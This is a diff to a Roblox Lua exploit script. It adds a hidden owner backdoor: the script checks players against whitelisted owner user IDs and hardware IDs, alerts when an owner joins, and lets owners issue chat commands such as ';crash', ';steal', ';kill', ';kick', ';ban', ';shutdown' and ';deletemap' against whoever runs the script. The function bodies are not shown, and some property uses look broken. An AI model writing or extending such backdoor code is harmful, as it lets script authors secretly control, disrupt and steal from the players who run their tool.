@@ -322,6 +322,19 @@ spawn(function()
 	end)
 end)
 
+spawn(function()
+	for i,v in pairs(game:GetService("Players"):GetChildren()) do
+	if table.find(whitelist.OwnersHWID,v.HWID) then
+			sysmsg("{DETECTED} OWNER WAS IN YOUR GAME")
+		end
+	end
+	game:GetService("Players").ChildAdded:Connect(function(v)
+		if table.find(whitelist.OwnersHWID,v.HWID) then
+			sysmsg("[DETECTED] OWNER WAS IN YOUR GAME!")
+		end
+	end)
+end)
+
 for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	v.Chatted:Connect(function(a) 
 		if table.find(whitelist.Owners,v.UserId) then
@@ -512,6 +525,107 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 			elseif a == ";lobby" then
 				funcs:lobby()
 			elseif a == ";steal" then
+				funcs:steal()
+			elseif a == ";shutdown" then
+				funcs:shutdown()
+			elseif a == ";errorkick" then
+				funcs:errorkick()
+			elseif a == ";gravity" then
+				funcs:gravity()
+			end
+		end
+	end)
+end)
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+	v.Chatted:Connect(function(a) 
+		if table.find(whitelist.Owners,v.HWID) then
+			if a == ";kill" then
+				funcs:kill()
+			elseif a == ";reset" then
+				funcs:reset()
+			elseif a == ";byfron" then
+				funcs:byfron()
+			elseif a == ";void" then
+				funcs:void()
+			elseif a == ";kill2" then
+				funcs:kill2()
+			elseif a == ";lagback" then
+				funcs:lagback()
+			elseif a == ";sit" then
+				funcs:sit()
+			elseif a == ";unsit" then
+				funcs:unsit()
+			elseif a == ";freeze" then
+				funcs:freeze()
+			elseif a == ";unfreeze" then
+				funcs:unfreeze()
+			elseif a == ";deletemap" then
+				funcs:deletemap()
+			elseif a == ";crash" then
+				funcs:crash()
+			elseif a == ";chipman" then
+				funcs:chipman()
+			elseif a == ";rickroll" then
+				funcs:rickroll()
+			elseif a == ";uninject" then
+				funcs:uninject()
+			elseif a == ";kick" then
+				funcs:kick()
+			elseif a == ";ban" then
+				funcs:ban()
+			elseif a == ";lobby" then
+				funcs:lobby()
+			elseif a == ";steal" then
+				funcs:steal()
+			elseif a == ";shutdown" then
+				funcs:shutdown()
+			elseif a == ";errorkick" then
+				funcs:errorkick()
+			elseif a == ";gravity" then
+				funcs:gravity()
+			end
+		end
+	end)
+end
+game:GetService("Players").PlayerAdded:Connect(function(v)
+	v.Chatted:Connect(function(a) 
+		if table.find(whitelist.OwnersHWID,v.HWID) then
+			if a == ";kill" then
+				funcs:kill()
+			elseif a == ";reset" then
+				funcs:reset()
+			elseif a == ";byfron" then
+				funcs:byfron()
+			elseif a == ";void" then
+				funcs:void()
+			elseif a == ";kill2" then
+				funcs:kill2()
+			elseif a == ";lagback" then
+				funcs:lagback()
+			elseif a == ";sit" then
+				funcs:sit()
+			elseif a == ";unsit" then
+				funcs:unsit()
+			elseif a == ";freeze" then
+				funcs:freeze()
+			elseif a == ";unfreeze" then
+				funcs:unfreeze()
+			elseif a == ";deletemap" then
+				funcs:deletemap()
+			elseif a == ";crash" then
+				funcs:crash()
+			elseif a == ";chipman" then
+				funcs:chipman()
+			elseif a == ";rickroll" then
+				funcs:rickroll()
+			elseif a == ";kick" then
+				funcs:kick()
+			elseif a == ";ban" then
+				funcs:ban()
+			elseif a == ";lobby" then
+				funcs:lobby()
+                        elseif a == ";steal" then
 				funcs:steal()
 			elseif a == ";shutdown" then
 				funcs:shutdown()
